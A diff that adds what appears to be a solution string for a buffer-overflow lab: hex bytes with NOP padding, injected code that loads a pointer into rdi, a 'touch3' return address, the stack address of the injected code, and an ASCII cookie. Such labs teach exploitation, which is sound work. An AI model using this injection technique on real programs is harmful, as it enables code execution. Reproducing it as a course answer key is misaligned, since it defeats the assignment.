@@ -1,0 +1,8 @@
+90 90 90 90 90 90 90 90
+48 83 ec 10 90 90 90 90 /* sub  $0x10,%rsp       */
+48 c7 c7 a8 dc 61 55 90 /* mov  $0x5561dca8,rdi  */
+c3 90 90 90 90 90 90 90 /* ret                   */
+fa 18 40 00 00 00 00 00 /* touch3 address        */
+80 dc 61 55 00 00 00 00 /* injected code address */
+35 39 62 39 39 37 66 61 /* cookie in ascii       */
+00                      /* '\0'                  */
